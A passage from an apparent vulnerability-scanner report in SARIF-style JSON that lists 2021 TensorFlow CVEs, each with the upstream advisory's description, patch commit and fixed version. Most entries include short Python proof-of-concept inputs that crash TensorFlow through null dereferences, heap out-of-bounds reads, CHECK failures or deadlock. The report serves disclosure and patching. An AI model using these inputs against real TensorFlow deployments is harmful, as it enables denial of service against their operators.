              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41215"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41215",
              "help": {
                "text": "Vulnerability CVE-2021-41215\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41215)\n### Impact\nThe [shape inference code for `DeserializeSparse`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/sparse_ops.cc#L152-L168) can trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ndataset = tf.data.Dataset.range(3)\n  \n@tf.function                 \ndef test():                  \n  y = tf.raw_ops.DeserializeSparse(\n    serialized_sparse=tf.data.experimental.to_variant(dataset),\n    dtype=tf.int32)\n\ntest()\n```\n\nThis is because the shape inference function assumes that the `serialize_sparse` tensor is a tensor with positive rank (and having `3` as the last dimension).  However, in the example above, the argument is a scalar (i.e., rank 0).\n\n### Patches\nWe have patched the issue in GitHub commit [d3738dd70f1c9ceb547258cbb82d853da8771850](https://github.com/tensorflow/tensorflow/commit/d3738dd70f1c9ceb547258cbb82d853da8771850).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41215**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41215)|\n\n### Impact\nThe [shape inference code for `DeserializeSparse`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/sparse_ops.cc#L152-L168) can trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ndataset = tf.data.Dataset.range(3)\n  \n@tf.function                 \ndef test():                  \n  y = tf.raw_ops.DeserializeSparse(\n    serialized_sparse=tf.data.experimental.to_variant(dataset),\n    dtype=tf.int32)\n\ntest()\n```\n\nThis is because the shape inference function assumes that the `serialize_sparse` tensor is a tensor with positive rank (and having `3` as the last dimension).  However, in the example above, the argument is a scalar (i.e., rank 0).\n\n### Patches\nWe have patched the issue in GitHub commit [d3738dd70f1c9ceb547258cbb82d853da8771850](https://github.com/tensorflow/tensorflow/commit/d3738dd70f1c9ceb547258cbb82d853da8771850).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41217",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41217"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41217",
              "help": {
                "text": "Vulnerability CVE-2021-41217\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41217)\n### Impact\nThe [process of building the control flow graph](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/common_runtime/immutable_executor_state.cc#L284-L346) for a TensorFlow model is vulnerable to a null pointer exception when nodes that should be paired are not:\n  \n```python\nimport tensorflow as tf\n  \n@tf.function\ndef func():\n  return tf.raw_ops.Exit(data=[False,False])\n    \nfunc()\n```\n\nThis occurs because the code assumes that the first node in the pairing (e.g., an `Enter` node) always exists when encountering the second node (e.g., an `Exit` node):\n  \n```cc\n  ...\n} else if (IsExit(curr_node)) {\n  // Exit to the parent frame.\n  parent = parent_nodes[curr_id];         \n  frame_name = cf_info-\u003eframe_names[parent-\u003eid()];\n  ...                \n```\n\nWhen this is not the case, `parent` is `nullptr` so dereferencing it causes a crash.\n\n### Patches\nWe have patched the issue in GitHub commit [05cbebd3c6bb8f517a158b0155debb8df79017ff](https://github.com/tensorflow/tensorflow/commit/05cbebd3c6bb8f517a158b0155debb8df79017ff).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41217**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41217)|\n\n### Impact\nThe [process of building the control flow graph](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/common_runtime/immutable_executor_state.cc#L284-L346) for a TensorFlow model is vulnerable to a null pointer exception when nodes that should be paired are not:\n  \n```python\nimport tensorflow as tf\n  \n@tf.function\ndef func():\n  return tf.raw_ops.Exit(data=[False,False])\n    \nfunc()\n```\n\nThis occurs because the code assumes that the first node in the pairing (e.g., an `Enter` node) always exists when encountering the second node (e.g., an `Exit` node):\n  \n```cc\n  ...\n} else if (IsExit(curr_node)) {\n  // Exit to the parent frame.\n  parent = parent_nodes[curr_id];         \n  frame_name = cf_info-\u003eframe_names[parent-\u003eid()];\n  ...                \n```\n\nWhen this is not the case, `parent` is `nullptr` so dereferencing it causes a crash.\n\n### Patches\nWe have patched the issue in GitHub commit [05cbebd3c6bb8f517a158b0155debb8df79017ff](https://github.com/tensorflow/tensorflow/commit/05cbebd3c6bb8f517a158b0155debb8df79017ff).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41225",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41225"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41225",
              "help": {
                "text": "Vulnerability CVE-2021-41225\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41225](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41225)\n### Impact\nTensorFlow`s Grappler optimizer has a [use of unitialized variable](https://github.com/tensorflow/tensorflow/blob/3457a2b122e50b4d44ceaaed5a663d635e5c22df/tensorflow/core/grappler/optimizers/auto_parallel.cc#L155-L164):\n\n```cc\n  const NodeDef* dequeue_node;\n  for (const auto\u0026 train_node : train_nodes) {\n    if (IsDequeueOp(*train_node)) {\n      dequeue_node = train_node;\n      break;\n    }\n  }\n\n  if (dequeue_node) {\n    ...\n  }\n```\n\nIf the `train_nodes` vector (obtained from the saved model that gets optimized) does not contain a `Dequeue` node, then `dequeue_node` is left unitialized.\n\n### Patches\nWe have patched the issue in GitHub commit [68867bf01239d9e1048f98cbad185bf4761bedd3](https://github.com/tensorflow/tensorflow/commit/68867bf01239d9e1048f98cbad185bf4761bedd3).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Qian Feng from Baidu Security Team.\n",
                "markdown": "**Vulnerability CVE-2021-41225**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41225](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41225)|\n\n### Impact\nTensorFlow`s Grappler optimizer has a [use of unitialized variable](https://github.com/tensorflow/tensorflow/blob/3457a2b122e50b4d44ceaaed5a663d635e5c22df/tensorflow/core/grappler/optimizers/auto_parallel.cc#L155-L164):\n\n```cc\n  const NodeDef* dequeue_node;\n  for (const auto\u0026 train_node : train_nodes) {\n    if (IsDequeueOp(*train_node)) {\n      dequeue_node = train_node;\n      break;\n    }\n  }\n\n  if (dequeue_node) {\n    ...\n  }\n```\n\nIf the `train_nodes` vector (obtained from the saved model that gets optimized) does not contain a `Dequeue` node, then `dequeue_node` is left unitialized.\n\n### Patches\nWe have patched the issue in GitHub commit [68867bf01239d9e1048f98cbad185bf4761bedd3](https://github.com/tensorflow/tensorflow/commit/68867bf01239d9e1048f98cbad185bf4761bedd3).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Qian Feng from Baidu Security Team.\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41204",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41204"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41204",
              "help": {
                "text": "Vulnerability CVE-2021-41204\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41204)\n### Impact\nDuring TensorFlow`s Grappler optimizer phase, constant folding might attempt to deep copy a resource tensor. This results in a segfault, as these tensors are supposed to not change.\n\n### Patches\nWe have patched the issue in GitHub commit [7731e8dfbe4a56773be5dc94d631611211156659](https://github.com/tensorflow/tensorflow/commit/7731e8dfbe4a56773be5dc94d631611211156659).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions",
                "markdown": "**Vulnerability CVE-2021-41204**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41204)|\n\n### Impact\nDuring TensorFlow`s Grappler optimizer phase, constant folding might attempt to deep copy a resource tensor. This results in a segfault, as these tensors are supposed to not change.\n\n### Patches\nWe have patched the issue in GitHub commit [7731e8dfbe4a56773be5dc94d631611211156659](https://github.com/tensorflow/tensorflow/commit/7731e8dfbe4a56773be5dc94d631611211156659).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41200",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41200"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41200",
              "help": {
                "text": "Vulnerability CVE-2021-41200\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41200](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41200)\n### Impact\nIf `tf.summary.create_file_writer` is called with non-scalar arguments code crashes due to a `CHECK`-fail.\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.summary.create_file_writer(logdir=``, flush_millis=np.ones((1,2)))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [874bda09e6702cd50bac90b453b50bcc65b2769e](https://github.com/tensorflow/tensorflow/commit/874bda09e6702cd50bac90b453b50bcc65b2769e) (merging [#51715](https://github.com/tensorflow/tensorflow/pull/51715)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46909).",
                "markdown": "**Vulnerability CVE-2021-41200**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41200](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41200)|\n\n### Impact\nIf `tf.summary.create_file_writer` is called with non-scalar arguments code crashes due to a `CHECK`-fail.\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.summary.create_file_writer(logdir=``, flush_millis=np.ones((1,2)))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [874bda09e6702cd50bac90b453b50bcc65b2769e](https://github.com/tensorflow/tensorflow/commit/874bda09e6702cd50bac90b453b50bcc65b2769e) (merging [#51715](https://github.com/tensorflow/tensorflow/pull/51715)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46909)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41213",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41213"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41213",
              "help": {
                "text": "Vulnerability CVE-2021-41213\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41213)\n### Impact\nThe [code behind `tf.function` API](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/python/eager/def_function.py#L542) can be made to deadlock when two `tf.function` decorated Python functions are mutually recursive:\n\n```python \nimport tensorflow as tf\n\n@tf.function()               \ndef fun1(num):\n    if num == 1:\n        return\n    print(num)\n    fun2(num-1)\n\n@tf.function()\ndef fun2(num):\n    if num == 0:\n        return\n    print(num)\n    fun1(num-1)\n\nfun1(9)\n```\n\nThis occurs due to using a non-reentrant `Lock` Python object.\n\nLoading any model which contains mutually recursive functions is vulnerable. An attacker can cause denial of service by causing users to load such models and calling a recursive `tf.function`, although this is not a frequent scenario.\n\n### Patches\nWe have patched the issue in GitHub commit [afac8158d43691661ad083f6dd9e56f327c1dcb7](https://github.com/tensorflow/tensorflow/commit/afac8158d43691661ad083f6dd9e56f327c1dcb7).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41213**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41213)|\n\n### Impact\nThe [code behind `tf.function` API](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/python/eager/def_function.py#L542) can be made to deadlock when two `tf.function` decorated Python functions are mutually recursive:\n\n```python \nimport tensorflow as tf\n\n@tf.function()               \ndef fun1(num):\n    if num == 1:\n        return\n    print(num)\n    fun2(num-1)\n\n@tf.function()\ndef fun2(num):\n    if num == 0:\n        return\n    print(num)\n    fun1(num-1)\n\nfun1(9)\n```\n\nThis occurs due to using a non-reentrant `Lock` Python object.\n\nLoading any model which contains mutually recursive functions is vulnerable. An attacker can cause denial of service by causing users to load such models and calling a recursive `tf.function`, although this is not a frequent scenario.\n\n### Patches\nWe have patched the issue in GitHub commit [afac8158d43691661ad083f6dd9e56f327c1dcb7](https://github.com/tensorflow/tensorflow/commit/afac8158d43691661ad083f6dd9e56f327c1dcb7).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41212",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41212"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41212",
              "help": {
                "text": "Vulnerability CVE-2021-41212\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41212)\n### Impact\nThe [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64) can trigger a read outside of bounds of heap allocated array:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.RaggedCross(ragged_values=[],\n                             ragged_row_splits=[],\n                             sparse_indices=[[5]],\n                             sparse_values=[],\n                             sparse_shape=[5],\n                             dense_inputs=[[`a`]],\n                             input_order=`RD`,\n                             hashed_output=False,\n                             num_buckets=5,\n                             hash_key=2,\n                             out_values_type=tf.string,\n                             out_row_splits_type=tf.int64)\n  return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41212**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41212)|\n\n### Impact\nThe [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64) can trigger a read outside of bounds of heap allocated array:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.RaggedCross(ragged_values=[],\n                             ragged_row_splits=[],\n                             sparse_indices=[[5]],\n                             sparse_values=[],\n                             sparse_shape=[5],\n                             dense_inputs=[[`a`]],\n                             input_order=`RD`,\n                             hashed_output=False,\n                             num_buckets=5,\n                             hash_key=2,\n                             out_values_type=tf.string,\n                             out_row_splits_type=tf.int64)\n  return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-41224",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41224"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41224",
              "help": {
                "text": "Vulnerability CVE-2021-41224\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41224)\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L194-L241) of `SparseFillEmptyRows` can be made to trigger a heap OOB access:\n\n```python\nimport tensorflow as tf\n  \ndata=tf.raw_ops.SparseFillEmptyRows(\n  indices=[[0,0],[0,0],[0,0]],\n  values=[`sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss`],\n  dense_shape=[5,3],\n  default_value=`o`)\n```\n  \nThis occurs whenever the size of `indices` does not match the size of `values`.\n\n### Patches\nWe have patched the issue in GitHub commit [67bfd9feeecfb3c61d80f0e46d89c170fbee682b](https://github.com/tensorflow/tensorflow/commit/67bfd9feeecfb3c61d80f0e46d89c170fbee682b).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41224**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41224)|\n\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L194-L241) of `SparseFillEmptyRows` can be made to trigger a heap OOB access:\n\n```python\nimport tensorflow as tf\n  \ndata=tf.raw_ops.SparseFillEmptyRows(\n  indices=[[0,0],[0,0],[0,0]],\n  values=[`sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss`],\n  dense_shape=[5,3],\n  default_value=`o`)\n```\n  \nThis occurs whenever the size of `indices` does not match the size of `values`.\n\n### Patches\nWe have patched the issue in GitHub commit [67bfd9feeecfb3c61d80f0e46d89c170fbee682b](https://github.com/tensorflow/tensorflow/commit/67bfd9feeecfb3c61d80f0e46d89c170fbee682b).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41201",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41201"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41201",
              "help": {
                "text": "Vulnerability CVE-2021-41201\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41201)\n### Impact\nDuring execution, [`EinsumHelper::ParseEquation()`](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/linalg/einsum_op_impl.h#L126-L181) is supposed to set the flags in `input_has_ellipsis` vector and `*output_has_ellipsis` boolean to indicate whether there is ellipsis in the corresponding inputs and output.\n\nHowever, the code only changes these flags to `true` and never assigns `false`.\n\n```cc\nfor (int i = 0; i \u003c num_inputs; ++i) {\n  input_label_counts-\u003eat(i).resize(num_labels);\n  for (const int label : input_labels-\u003eat(i)) {\n    if (label != kEllipsisLabel)\n      input_label_counts-\u003eat(i)[label] += 1;\n    else\n      input_has_ellipsis-\u003eat(i) = true;\n  }\n}\noutput_label_counts-\u003eresize(num_labels);\nfor (const int label : *output_labels) {\n  if (label != kEllipsisLabel)\n    output_label_counts-\u003eat(label) += 1;\n  else\n    *output_has_ellipsis = true;\n}\n```\n\nThis results in unitialized variable access if callers assume that `EinsumHelper::ParseEquation()` always sets these flags.\n\n\n### Patches\nWe have patched the issue in GitHub commit [f09caa532b6e1ac8d2aa61b7832c78c5b79300c6](https://github.com/tensorflow/tensorflow/commit/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-41201**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41201)|\n\n### Impact\nDuring execution, [`EinsumHelper::ParseEquation()`](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/linalg/einsum_op_impl.h#L126-L181) is supposed to set the flags in `input_has_ellipsis` vector and `*output_has_ellipsis` boolean to indicate whether there is ellipsis in the corresponding inputs and output.\n\nHowever, the code only changes these flags to `true` and never assigns `false`.\n\n```cc\nfor (int i = 0; i \u003c num_inputs; ++i) {\n  input_label_counts-\u003eat(i).resize(num_labels);\n  for (const int label : input_labels-\u003eat(i)) {\n    if (label != kEllipsisLabel)\n      input_label_counts-\u003eat(i)[label] += 1;\n    else\n      input_has_ellipsis-\u003eat(i) = true;\n  }\n}\noutput_label_counts-\u003eresize(num_labels);\nfor (const int label : *output_labels) {\n  if (label != kEllipsisLabel)\n    output_label_counts-\u003eat(label) += 1;\n  else\n    *output_has_ellipsis = true;\n}\n```\n\nThis results in unitialized variable access if callers assume that `EinsumHelper::ParseEquation()` always sets these flags.\n\n\n### Patches\nWe have patched the issue in GitHub commit [f09caa532b6e1ac8d2aa61b7832c78c5b79300c6](https://github.com/tensorflow/tensorflow/commit/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-41197",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41197"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41197",
